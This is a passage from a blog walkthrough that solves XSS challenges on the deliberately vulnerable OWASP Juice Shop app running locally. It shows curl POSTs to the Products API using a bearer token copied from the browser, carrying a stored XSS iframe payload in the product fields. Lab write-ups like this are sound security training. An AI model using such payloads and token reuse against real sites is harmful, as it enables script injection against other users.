<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="ex">{</span><span class="st">&quot;status&quot;</span><span class="ex">:</span><span class="st">&quot;success&quot;</span><span class="ex">,</span><span class="st">&quot;data&quot;</span><span class="ex">:[</span><span class="dt">{</span><span class="st">&quot;id&quot;</span><span class="dt">:1</span><span class="op">,</span><span class="st">&quot;name&quot;</span><span class="dt">:</span><span class="st">&quot;Apple Juice (1000ml)&quot;</span><span class="op">,</span><span class="st">&quot;description&quot;</span><span class="dt">:</span><span class="st">&quot;The all-time classic.&quot;</span><span class="op">,</span><span class="st">&quot;price&quot;</span><span class="dt">:1.99</span><span class="op">,</span><span class="st">&quot;deluxePrice&quot;</span><span class="dt">:0.99</span><span class="op">,</span><span class="st">&quot;image&quot;</span><span class="dt">:</span><span class="st">&quot;apple_juice.jpg&quot;</span><span class="op">,</span><span class="st">&quot;createdAt&quot;</span><span class="dt">:</span><span class="st">&quot;2023-09-26T23:12:11.190Z&quot;</span><span class="op">,</span><span class="st">&quot;updatedAt&quot;</span><span class="dt">:</span><span class="st">&quot;2023-09-26T23:12:11.190Z&quot;</span><span class="op">,</span><span class="st">&quot;deletedAt&quot;</span><span class="dt">:null}</span></span>
<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span></code></pre></div>
<p>ok, looks good. Can we post to it?</p>
<p>I assume the data will take the form:</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode json"><code class="sourceCode json"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&quot;id&quot;</span><span class="fu">:</span> <span class="er">number</span><span class="fu">,</span></span>
<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&quot;name&quot;</span><span class="fu">:</span> <span class="er">string</span><span class="fu">,</span></span>
<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&quot;description&quot;</span><span class="fu">:</span> <span class="er">string</span><span class="fu">,</span></span>
<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&quot;price&quot;</span><span class="fu">:</span> <span class="er">number</span><span class="fu">,</span></span>
<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&quot;deluxePrice&quot;</span><span class="fu">:</span> <span class="er">number</span><span class="fu">,</span></span>
<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&quot;image&quot;</span><span class="fu">:</span> <span class="er">string</span><span class="fu">,</span></span>
<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&quot;createdAt&quot;</span><span class="fu">:</span> <span class="er">datestring</span><span class="fu">,</span></span>
<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&quot;updatedAt&quot;</span><span class="fu">:</span> <span class="er">datestring</span><span class="fu">,</span></span>
<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&quot;deletedAt&quot;</span><span class="fu">:</span> <span class="er">datestring?</span></span>
<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
<p>So we get the command:</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-XPOST</span> <span class="at">-H</span> <span class="st">&quot;Content-type: application/json&quot;</span> <span class="at">-d</span> <span class="st">&#39;{</span></span>
<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="st">      &quot;id&quot;: 123456,</span></span>
<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="st">      &quot;name&quot;: &quot;TEST &lt;b&gt;BOLD&lt;/b&gt;&quot;,</span></span>
<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="st">      &quot;description&quot;: &quot;TEST &lt;b&gt;BOLD&lt;/b&gt;&quot;,</span></span>
<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a><span class="st">      &quot;price&quot;: 1,</span></span>
<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a><span class="st">      &quot;deluxePrice&quot;: 2,</span></span>
<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a><span class="st">      &quot;image&quot;: &quot;TEST &lt;b&gt;BOLD&lt;/b&gt;&quot;,</span></span>
<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a><span class="st">      &quot;createdAt&quot;:&quot;2023-09-26T23:12:11.190Z&quot;,</span></span>
<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a><span class="st">      &quot;updatedAt&quot;:&quot;2023-09-26T23:12:11.190Z&quot;,</span></span>
<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a><span class="st">      &quot;deletedAt&quot;:null</span></span>
<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a><span class="st">}&#39;</span> <span class="st">&#39;http://localhost:3000/api/Products&#39;</span></span></code></pre></div>
<p>We get back a response that includes:</p>
<pre><code>&lt;em&gt;401&lt;/em&gt; UnauthorizedError: No Authorization header was found&lt;/h2&gt;</code></pre>
<p>At this point, we get the flag for “Error Handling (Provoke an error that is neither very gracefully nor consistently handled.)”. If only that’s what I wanted.</p>
<p>We can look in our network tab under “headers”, and see the authorization header that we’re currently using:</p>
<figure>
<img src="../assets/juice-shop/image-20230926212037141.png" alt="Developer Tools -&gt; Network -&gt; Select a request to the API -&gt; Headers" /><figcaption aria-hidden="true">Developer Tools -&gt; Network -&gt; Select a request to the API -&gt; Headers</figcaption>
</figure>
<p>We see that we have something like “Authorization: Bearer {token}”</p>
<p>We can copy this into our cURL command, and add a header just like our <code>--header "Content-Type: application/json"</code>:</p>
<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-XPOST</span> <span class="at">-H</span> <span class="st">&quot;Content-type: application/json&quot;</span> <span class="at">-H</span> <span class="st">&quot;Authorization: Bearer {token}&quot;</span> <span class="at">-d</span> <span class="st">&#39;{</span></span>
<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="st">      &quot;id&quot;: 123456,</span></span>
<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="st">      &quot;name&quot;: &quot;TEST &lt;b&gt;BOLD&lt;/b&gt;&quot;,</span></span>
<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a><span class="st">      &quot;description&quot;: &quot;TEST &lt;b&gt;BOLD&lt;/b&gt;&quot;,</span></span>
<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="st">      &quot;price&quot;: 1,</span></span>
<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a><span class="st">      &quot;deluxePrice&quot;: 2,</span></span>
<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a><span class="st">      &quot;image&quot;: &quot;TEST &lt;b&gt;BOLD&lt;/b&gt;&quot;,</span></span>
<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a><span class="st">      &quot;createdAt&quot;:&quot;2023-09-26T23:12:11.190Z&quot;,</span></span>
<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a><span class="st">      &quot;updatedAt&quot;:&quot;2023-09-26T23:12:11.190Z&quot;,</span></span>
<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a><span class="st">      &quot;deletedAt&quot;:null</span></span>
<span id="cb10-11"><a href="#cb10-11" aria-hidden="true" tabindex="-1"></a><span class="st">}&#39;</span> <span class="st">&#39;http://localhost:3000/api/Products&#39;</span></span></code></pre></div>
<p>and we get back something like:</p>
<div class="sourceCode" id="cb11"><pre class="sourceCode json"><code class="sourceCode json"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;status&quot;</span><span class="fu">:</span> <span class="st">&quot;success&quot;</span><span class="fu">,</span></span>
<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;data&quot;</span><span class="fu">:</span> <span class="fu">{</span></span>
<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;id&quot;</span><span class="fu">:</span> <span class="dv">123456</span><span class="fu">,</span></span>
<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;name&quot;</span><span class="fu">:</span> <span class="st">&quot;TEST &lt;b&gt;BOLD&lt;/b&gt;&quot;</span><span class="fu">,</span></span>
<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;description&quot;</span><span class="fu">:</span> <span class="st">&quot;TEST &lt;b&gt;BOLD&lt;/b&gt;&quot;</span><span class="fu">,</span></span>
<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;price&quot;</span><span class="fu">:</span> <span class="dv">1</span><span class="fu">,</span></span>
<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;deluxePrice&quot;</span><span class="fu">:</span> <span class="dv">2</span><span class="fu">,</span></span>
<span id="cb11-9"><a href="#cb11-9" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;image&quot;</span><span class="fu">:</span> <span class="st">&quot;TEST &lt;b&gt;BOLD&lt;/b&gt;&quot;</span><span class="fu">,</span></span>
<span id="cb11-10"><a href="#cb11-10" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;createdAt&quot;</span><span class="fu">:</span> <span class="st">&quot;2023-09-26T23:12:11.190Z&quot;</span><span class="fu">,</span></span>
<span id="cb11-11"><a href="#cb11-11" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;updatedAt&quot;</span><span class="fu">:</span> <span class="st">&quot;2023-09-27T01:24:17.774Z&quot;</span><span class="fu">,</span></span>
<span id="cb11-12"><a href="#cb11-12" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;deletedAt&quot;</span><span class="fu">:</span> <span class="kw">null</span></span>
<span id="cb11-13"><a href="#cb11-13" aria-hidden="true" tabindex="-1"></a>  <span class="fu">}</span></span>
<span id="cb11-14"><a href="#cb11-14" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
<p>So, now we can enter the payload into the description (remembering to escape the quotes):</p>
<pre><code>&lt;iframe src=&quot;javascript:alert(`xss`)&quot;&gt;</code></pre>
<div class="sourceCode" id="cb13"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-XPOST</span> <span class="at">-H</span> <span class="st">&quot;Content-type: application/json&quot;</span> <span class="at">-H</span> <span class="st">&quot;Authorization: Bearer {token}&quot;</span> <span class="at">-d</span> <span class="st">&#39;{</span></span>
<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="st">      &quot;id&quot;: 123458,</span></span>
<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a><span class="st">      &quot;name&quot;: &quot;&lt;iframe src=\&quot;javascript:alert(`xss`)\&quot;&gt;&quot;,</span></span>
<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a><span class="st">      &quot;description&quot;: &quot;&lt;iframe src=\&quot;javascript:alert(`xss`)\&quot;&gt;&quot;,</span></span>
<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a><span class="st">      &quot;price&quot;: 1,</span></span>
<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a><span class="st">      &quot;deluxePrice&quot;: 2,</span></span>
<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a><span class="st">      &quot;image&quot;: &quot;TEST &lt;b&gt;BOLD&lt;/b&gt;&quot;,</span></span>
<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a><span class="st">      &quot;createdAt&quot;:&quot;2023-09-26T23:12:11.190Z&quot;,</span></span>
<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a><span class="st">      &quot;updatedAt&quot;:&quot;2023-09-26T23:12:11.190Z&quot;,</span></span>
<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a><span class="st">      &quot;deletedAt&quot;:null</span></span>
<span id="cb13-11"><a href="#cb13-11" aria-hidden="true" tabindex="-1"></a><span class="st">}&#39;</span> <span class="st">&#39;http://localhost:3000/api/Products&#39;</span></span></code></pre></div>
<p>And we get our flag.</p>
<h1 id="conclusion">Conclusion</h1>
<p>These are the solutions for the first 5 problems out of 10. If I have more time, I’ll solve the other 50% on my own.</p>
<p>If you’re looking for solutions, you might want to check out these writeups:</p>
<ul>
<li><a href="https://github.com/refabr1k/owasp-juiceshop-solutions" class="uri">https://github.com/refabr1k/owasp-juiceshop-solutions</a></li>
<li><a href="https://help.owasp-juice.shop/appendix/solutions.html" class="uri">https://help.owasp-juice.shop/appendix/solutions.html</a></li>
</ul>


    </article>
  </main>

<footer>
  <style>
    .edit {
      margin-bottom: 1em;
    }
    .page-bottom {
      display: flex;
      justify-content: space-between;
      margin-bottom: 2em;
    }
  </style>

  <div class="page-bottom">
    <div class="copyright">
      &copy; 2023 Zack Sargent
    </div>
    <div class="top">
      <a href="javascript:window.scrollTo({ top: 0, behavior: 'smooth' })">
        Go to Top
      </a>
    </div>
  </div>

  
    <details>
      <summary>See edit history for "OWASP Juice Shop XSS Walkthrough"</summary>
      <dl class="edits">
        
          <div class="edit">
            <dt>
              Zack Sargent edited this page on 
              <time datetime="2023-09-29T01:06:49-04:00">
                Friday, September 29, 2023 at 01:06 AM
              </time>
            </dt>
            <dd>
              1 file changed, 2 insertions(+), 2 deletions(-)
            </dd>
          </div>
        
          <div class="edit">
            <dt>
              Zack Sargent edited this page on 
              <time datetime="2023-09-26T22:49:23-04:00">
                Tuesday, September 26, 2023 at 10:49 PM
              </time>
            </dt>
            <dd>
              1 file changed, 1 insertion(+), 1 deletion(-)
            </dd>
          </div>
        
          <div class="edit">
            <dt>
              Zack Sargent edited this page on 
              <time datetime="2023-09-26T22:37:25-04:00">
                Tuesday, September 26, 2023 at 10:37 PM
              </time>
            </dt>
            <dd>
              1 file changed, 1 insertion(+), 1 deletion(-)
            </dd>
          </div>
        
          <div class="edit">
            <dt>
              Zack Sargent edited this page on 
              <time datetime="2023-09-26T22:36:05-04:00">
                Tuesday, September 26, 2023 at 10:36 PM
              </time>
            </dt>
            <dd>
              1 file changed, 1 insertion(+), 1 deletion(-)
            </dd>
          </div>
        
          <div class="edit">
            <dt>
              Zack Sargent edited this page on 
              <time datetime="2023-09-26T22:30:59-04:00">
                Tuesday, September 26, 2023 at 10:30 PM
              </time>
            </dt>
            <dd>
              1 file changed, 8 insertions(+), 4 deletions(-)
            </dd>
          </div>
        
          <div class="edit">
            <dt>
              Zack Sargent edited this page on 
              <time datetime="2023-09-26T21:35:42-04:00">
                Tuesday, September 26, 2023 at 09:35 PM
              </time>
            </dt>
            <dd>
              1 file changed, 385 insertions(+)
            </dd>
          </div>
        
      </dl>
    </details>
  
</footer>

  <script>
    anchors.add('h1:not(.post-title), h2, h3, h4, h5, h6');
  </script>
</body>

</html>
